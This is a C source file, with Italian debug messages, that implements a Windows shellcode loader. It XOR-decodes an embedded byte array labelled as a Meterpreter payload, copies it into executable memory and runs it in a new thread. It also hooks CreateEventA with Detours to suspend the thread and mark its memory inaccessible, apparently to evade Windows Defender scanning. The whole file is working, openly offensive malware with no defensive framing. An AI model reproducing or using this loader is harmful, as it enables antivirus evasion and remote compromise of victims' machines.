#include <windows.h>
#include <stdio.h>
#include <detours.h>
#pragma comment(lib, "user32.lib")


//int (WINAPI * pCreateEventA) (HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType);
/*BOOL(WINAPI* pCreateEventA)(LPCWSTR  lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL  bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR  lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo) = CreateEventA;*/

BOOL hook_defender(void);
BOOL unhook_defender(void);
HANDLE th = NULL;
HANDLE th_1 = NULL;
PVOID func = NULL;

void* exec_mem = NULL;
DWORD oldprotect = 0;



void XOR(char* data, size_t data_len) {
    for (int i = 0; i < data_len; i++)
        data[i] = data[i] ^ 0x99;
}

/*
HANDLE CreateEventA(
    [in, optional] LPSECURITY_ATTRIBUTES lpEventAttributes,
    [in]           BOOL                  bManualReset,
    [in]           BOOL                  bInitialState,
    [in, optional] LPCSTR                lpName
);*/



int hook_CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL  bManualReset, BOOL bInitialState, LPCSTR lpName) {
    printf("\ndentro hook\n");

    SuspendThread(th);

    VirtualProtect((LPVOID)exec_mem, sizeof(exec_mem), PAGE_NOACCESS, &oldprotect);
    printf("\nDopo SuspendThread()\n");

    unhook_defender();


    HANDLE hEvent = CreateEventA(lpEventAttributes, bManualReset, bInitialState, lpName);


    VirtualProtect((LPVOID)exec_mem, sizeof(exec_mem), PAGE_EXECUTE_READ, &oldprotect);


    ResumeThread(th);

    printf("\nDopo ResumeThread()\n");

    

    return IDOK;
}

//CreateEventA
BOOL hook_defender(void) {
    LONG err;

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    func = DetourFindFunction("Kernel32.dll", "CreateEventA");

    DetourAttach(&(PVOID&)func, (PVOID) hook_CreateEventA);
    err = DetourTransactionCommit();


    printf("funzione hookata con risultato %d\n", err);

    Sleep(5000);

    return TRUE;

}

BOOL unhook_defender(void) {
    LONG err;

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    //PVOID func = DetourFindFunction("Kernel32.dll", "CreateEventA");

    DetourDetach(&(PVOID&)func, (PVOID)hook_CreateEventA);

    err = DetourTransactionCommit();
    
    printf("funzione un-hookata con risultato %d\n", err);

    return TRUE;

}


//Inside the installHook function youâ€™ll see we save the current state of the memory then replace the memory at the CreateEventA address
// with a JMP instruction to our hook so when CreateEventA is called our code will be called instead. 
//A restoreHook function was also created to do the reverse. 

int main(void) {




    unsigned char payload_meterpreter[] = { 0x65, 0xd1, 0x1a, 0x7d, 0x69, 0x71, 0x55, 0x99, 0x99, 0x99, 0xd8, 0xc8, 0xd8, 0xc9, 0xcb, 0xd1, 0xa8, 0x4b, 0xc8, 0xfc, 0xd1, 0x12, 0xcb, 0xf9, 0xd1, 0x12, 0xcb, 0x81, 0xd1, 0x12, 0xcb, 0xb9, 0xcf, 0xd1, 0x96, 0x2e, 0xd3, 0xd3, 0xd1, 0x12, 0xeb, 0xc9, 0xd4, 0xa8, 0x50, 0xd1, 0xa8, 0x59, 0x35, 0xa5, 0xf8, 0xe5, 0x9b, 0xb5, 0xb9, 0xd8, 0x58, 0x50, 0x94, 0xd8, 0x98, 0x58, 0x7b, 0x74, 0xcb, 0xd8, 0xc8, 0xd1, 0x12, 0xcb, 0xb9, 0x12, 0xdb, 0xa5, 0xd1, 0x98, 0x49, 0xff, 0x18, 0xe1, 0x81, 0x92, 0x9b, 0x96, 0x1c, 0xeb, 0x99, 0x99, 0x99, 0x12, 0x19, 0x11, 0x99, 0x99, 0x99, 0xd1, 0x1c, 0x59, 0xed, 0xfe, 0xd1, 0x98, 0x49, 0xc9, 0x12, 0xd1, 0x81, 0xdd, 0x12, 0xd9, 0xb9, 0xd0, 0x98, 0x49, 0x7a, 0xcf, 0xd4, 0xa8, 0x50, 0xd1, 0x66, 0x50, 0xd8, 0x12, 0xad, 0x11, 0xd1, 0x98, 0x4f, 0xd1, 0xa8, 0x59, 0x35, 0xd8, 0x58, 0x50, 0x94, 0xd8, 0x98, 0x58, 0xa1, 0x79, 0xec, 0x68, 0xd5, 0x9a, 0xd5, 0xbd, 0x91, 0xdc, 0xa0, 0x48, 0xec, 0x41, 0xc1, 0xdd, 0x12, 0xd9, 0xbd, 0xd0, 0x98, 0x49, 0xff, 0xd8, 0x12, 0x95, 0xd1, 0xdd, 0x12, 0xd9, 0x85, 0xd0, 0x98, 0x49, 0xd8, 0x12, 0x9d, 0x11, 0xd1, 0x98, 0x49, 0xd8, 0xc1, 0xd8, 0xc1, 0xc7, 0xc0, 0xc3, 0xd8, 0xc1, 0xd8, 0xc0, 0xd8, 0xc3, 0xd1, 0x1a, 0x75, 0xb9, 0xd8, 0xcb, 0x66, 0x79, 0xc1, 0xd8, 0xc0, 0xc3, 0xd1, 0x12, 0x8b, 0x70, 0xd2, 0x66, 0x66, 0x66, 0xc4, 0xd0, 0x27, 0xee, 0xea, 0xab, 0xc6, 0xaa, 0xab, 0x99, 0x99, 0xd8, 0xcf, 0xd0, 0x10, 0x7f, 0xd1, 0x18, 0x75, 0x39, 0x98, 0x99, 0x99, 0xd0, 0x10, 0x7c, 0xd0, 0x25, 0x9b, 0x99, 0x88, 0xc5, 0x59, 0x31, 0x98, 0xc5, 0xd8, 0xcd, 0xd0, 0x10, 0x7d, 0xd5, 0x10, 0x68, 0xd8, 0x23, 0xd5, 0xee, 0xbf, 0x9e, 0x66, 0x4c, 0xd5, 0x10, 0x73, 0xf1, 0x98, 0x98, 0x99, 0x99, 0xc0, 0xd8, 0x23, 0xb0, 0x19, 0xf2, 0x99, 0x66, 0x4c, 0xf3, 0x93, 0xd8, 0xc7, 0xc9, 0xc9, 0xd4, 0xa8, 0x50, 0xd4, 0xa8, 0x59, 0xd1, 0x66, 0x59, 0xd1, 0x10, 0x5b, 0xd1, 0x66, 0x59, 0xd1, 0x10, 0x58, 0xd8, 0x23, 0x73, 0x96, 0x46, 0x79, 0x66, 0x4c, 0xd1, 0x10, 0x5e, 0xf3, 0x89, 0xd8, 0xc1, 0xd5, 0x10, 0x7b, 0xd1, 0x10, 0x60, 0xd8, 0x23, 0x0, 0x3c, 0xed, 0xf8, 0x66, 0x4c, 0x1c, 0x59, 0xed, 0x93, 0xd0, 0x66, 0x57, 0xec, 0x7c, 0x71, 0xa, 0x99, 0x99, 0x99, 0xd1, 0x1a, 0x75, 0x89, 0xd1, 0x10, 0x7b, 0xd4, 0xa8, 0x50, 0xf3, 0x9d, 0xd8, 0xc1, 0xd1, 0x10, 0x60, 0xd8, 0x23, 0x9b, 0x40, 0x51, 0xc6, 0x66, 0x4c, 0x1a, 0x61, 0x99, 0xe7, 0xcc, 0xd1, 0x1a, 0x5d, 0xb9, 0xc7, 0x10, 0x6f, 0xf3, 0xd9, 0xd8, 0xc0, 0xf1, 0x99, 0x89, 0x99, 0x99, 0xd8, 0xc1, 0xd1, 0x10, 0x6b, 0xd1, 0xa8, 0x50, 0xd8, 0x23, 0xc1, 0x3d, 0xca, 0x7c, 0x66, 0x4c, 0xd1, 0x10, 0x5a, 0xd0, 0x10, 0x5e, 0xd4, 0xa8, 0x50, 0xd0, 0x10, 0x69, 0xd1, 0x10, 0x43, 0xd1, 0x10, 0x60, 0xd8, 0x23, 0x9b, 0x40, 0x51, 0xc6, 0x66, 0x4c, 0x1a, 0x61, 0x99, 0xe4, 0xb1, 0xc1, 0xd8, 0xce, 0xc0, 0xf1, 0x99, 0xd9, 0x99, 0x99, 0xd8, 0xc1, 0xf3, 0x99, 0xc3, 0xd8, 0x23, 0x92, 0xb6, 0x96, 0xa9, 0x66, 0x4c, 0xce, 0xc0, 0xd8, 0x23, 0xec, 0xf7, 0xd4, 0xf8, 0x66, 0x4c, 0xd0, 0x66, 0x57, 0x70, 0xa5, 0x66, 0x66, 0x66, 0xd1, 0x98, 0x5a, 0xd1, 0xb0, 0x5f, 0xd1, 0x1c, 0x6f, 0xec, 0x2d, 0xd8, 0x66, 0x7e, 0xc1, 0xf3, 0x99, 0xc0, 0xd0, 0x5e, 0x5b, 0x69, 0x2c, 0x3b, 0xcf, 0x66, 0x4c };
    int payload_len = sizeof(payload_meterpreter);


    for (int i = 0; i < payload_len; i++) {
        printf("0x%02x ", payload_meterpreter[i]);

    }



    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    printf("%-20s : 0x%-016p\n", "payload addr", (void*)payload_meterpreter);
    printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)exec_mem);

    memcpy(exec_mem, payload_meterpreter, payload_len);
    XOR((char*)exec_mem, payload_len);

    for (int i = 0; i < payload_len; i++) {
        printf("0x%02x ", ((unsigned char*)exec_mem)[i]);
    }


    // Create a new process.


    //Sleep(2000);
    hook_defender();

    th_1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, (LPVOID)th, 0, 0);


    WaitForSingleObject(th_1, -1);
    printf("DOPo DI WAITFORSINGLEOBJECT");



    return 0;
}
